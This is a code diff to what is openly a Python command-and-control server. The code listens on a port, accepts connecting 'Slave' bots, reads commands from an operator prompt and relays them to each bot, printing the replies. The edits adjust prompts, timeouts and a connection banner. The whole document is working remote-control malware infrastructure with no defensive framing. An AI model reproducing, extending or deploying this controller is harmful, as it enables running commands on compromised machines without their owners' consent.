@@ -29,7 +29,7 @@ def listener(lhost,lport,q):
     server.bind((lhost,lport))
     server.listen(100)
 
-    print("[+] Starting C&C server on tcp://{}:{}\n".format(lhost,lport))
+    print("[+] Starting C&C server on tcp://{}:{}".format(lhost,lport))
     
     BotCmdThread = BotCmd(q)
     BotCmdThread.start()
@@ -41,7 +41,7 @@ def listener(lhost,lport,q):
 
 
 class Terminal(Cmd):
-    prompt = '> '
+    prompt = ''
     def __init__(self, qv3):
         # super() needed to correctly initialize class
         super(Terminal, self).__init__()
@@ -55,7 +55,7 @@ class Terminal(Cmd):
         os._exit(0)
 
     def emptyline(self):
-        pass
+        self.q.put("\n")
 
     def default(self, args):
         # print("[DBG] Command entered: {}".format(args))
@@ -85,16 +85,23 @@ class BotHandler(threading.Thread):
 
     def run(self):
         BotName = threading.current_thread().getName()
-        print("\n[*] Slave {}:{} connected with Thread-ID: {}".format(self.ip,self.port,BotName))
+        print("\n[*] Slave {}:{} connected with Thread-ID: {}\n".format(self.ip,self.port,BotName))
+        self.client.send("Verifying connection. Go to process creation thread.".encode("utf-8"))
+        try:
+            self.client.settimeout(3)
+            banner = self.client.recv(1024).decode('utf-8')
+            print(banner)
+        except:
+            pass
         self.ClientList[BotName] = self.client_address
         while True:
             RecvBotCmd = self.q.get()
             try:
                 self.client.send(RecvBotCmd.encode('utf-8'))
-                self.client.settimeout(1)
+                self.client.settimeout(3)
                 try:
                     resp = self.client.recv(1024).decode('utf-8')
-                    print("[+] {} reponse: {}".format(BotName, resp))
+                    print(resp)
                 except:
                     continue
             except Exception as ex:
